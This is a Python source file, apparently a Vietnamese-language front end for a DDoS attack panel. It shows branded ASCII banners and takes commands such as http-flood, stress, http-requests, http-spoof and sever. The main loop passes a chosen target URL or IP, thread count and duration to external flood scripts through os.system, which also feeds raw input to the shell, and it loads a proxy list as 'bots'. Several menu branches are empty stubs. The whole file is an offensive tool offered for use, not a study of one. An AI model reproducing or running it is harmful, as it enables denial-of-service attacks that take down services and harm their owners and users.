from colorama import Fore, Back, Style
import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(Fore.BLUE + """
     ██░ ██  ▄▄▄     ▄▄▄█████▓ ▒█████   ██ ▄█▀ ██▓
    ▓██░ ██▒▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒ ▓██▒
    ▒██▀▀██░▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓███▄░ ▒██▒
    ░▓█ ░██ ░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▓██ █▄ ░██░
    ░▓█▒░██▓ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░▒██▒ █▄░██░
     ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▓  
     ▒ ░▒░ ░  ▒   ▒▒ ░   ░      ░ ▒ ▒░ ░ ░▒ ▒░ ▒ ░
     ░  ░░ ░  ░   ▒    ░      ░ ░ ░ ▒  ░ ░░ ░  ▒ ░
     ░  ░  ░      ░  ░            ░ ░  ░  ░    ░   VƯơNG TIẾN ĐẠT
                                           """)
    time.sleep(1.8)
    clear()

def si():
    print(Fore.YELLOW + """Trùm Proxy Koc Vương Tiến Đat""")
    print("TienDatVuong")

def menu():
    sys.stdout.write(f"Vương Tiến Đạt")
    clear()
    print('[ Vuong Tien Dat]')
    print("FB : Vương Tiến Đạt")
    print(Fore.RED + """

            ██░ ██  ▄▄▄     ▄▄▄█████▓ ▒█████   ██ ▄█▀ ██▓
    ▓██░ ██▒▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒ ▓██▒
    ▒██▀▀██░▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓███▄░ ▒██▒
    ░▓█ ░██ ░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▓██ █▄ ░██░
    ░▓█▒░██▓ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░▒██▒ █▄░██░
     ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▓  
     ▒ ░▒░ ░  ▒   ▒▒ ░   ░      ░ ▒ ▒░ ░ ░▒ ▒░ ▒ ░
     ░  ░░ ░  ░   ▒    ░      ░ ░ ░ ▒  ░ ░░ ░  ▒ ░
     ░  ░  ░      ░  ░            ░ ░  ░  ░    ░   Code By TienDatVuong
""")


def main():
    menu()
    while(True):
        cnc = input('''Nhập Command :''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            ()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            ()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            ()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            ()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            ()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            ()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            ()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            ()

        elif "http-flood" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                methods = cnc.split()[3]
                time = cnc.split()[4]
                header = cnc.split()[5]
                os.system(f'go run flood.go {url} {threads} {methods} {time} {header}')
            except IndexError:
                print(Fore.BLUE +'Usage: http-socket <url> <per> <time>')
                print(Fore.BLUE +'Example: http-socket http://TienDatVuong.Xyzl 5000 60')

        elif "?" in cnc:
            try:
                print(Fore.BLUE + "              Có 4 Methods Chính (go, js, py):")
                print("1" + Fore.RED + "     http-flood" + Fore.BLUE + " <url>" + Fore.YELLOW + Fore.RED + " <threads>" + Fore.YELLOW + " <GET/POST> +" + Fore.BLUE +" <time>" + Fore.RED + " header.txt")
                print("2" + Fore.RED + "     stress" + Fore.BLUE + " <ip>" + Fore.BLUE + " <port>" + Fore.YELLOW + " <mode>" + Fore.RED + " <connection>" + Fore.BLUE + " <time>" + Fore.YELLOW + " <time out>")
                print("3"+Fore.BLUE+"                  http-rand" + Fore.RED + " <url>" + Fore.YELLOW + " <time>")
                print("4" +Fore.BLUE + "                   sever" + Fore.RED + " <url>" + Fore.YELLOW + " <GET/POST>")
            except IndexError:
                print(Fore.BLUE +'Usage: http-raw <url> <time>')
                print(Fore.BLUE +'Example: http-raw VuongTienDat.info/ 60')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print(Fore.BLUE +'Usage: http-requests <url> <time>')
                print(Fore.BLUE +'Example: http-requests http://TienDatVuong.Xyzl 60')

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print(Fore.BLUE +'Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print(Fore.BLUE +'MODE: [1] TCP')
                print(Fore.BLUE +'      [2] UDP')
                print(Fore.BLUE +'      [3] HTTP')
                print(Fore.BLUE +'Example: stress 1.1.1.1 80/443 3 1250 60 5')
                
                

        elif "http-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'python spoof.py {url} {time} {threads}')
            except IndexError:
                print(Fore.BLUE +'Usage: spoof <url> <time> <threads>')
                print(Fore.BLUE +'Example: http-rand http://TienDatVuong.Xyzl 60')

        elif "sever" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run sever.go -site {url} -data {method}')
            except IndexError:
                print(Fore.BLUE +'Usage: sever <url> METHODS<GET/POST>')
                print(Fore.BLUE +'Example: sever http://TienDatVuong.Xyzl GET')
                

        elif "info" in cnc:
            print(f'''
Con CC
            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Command Đéo Có")
            except IndexError:
                pass
main()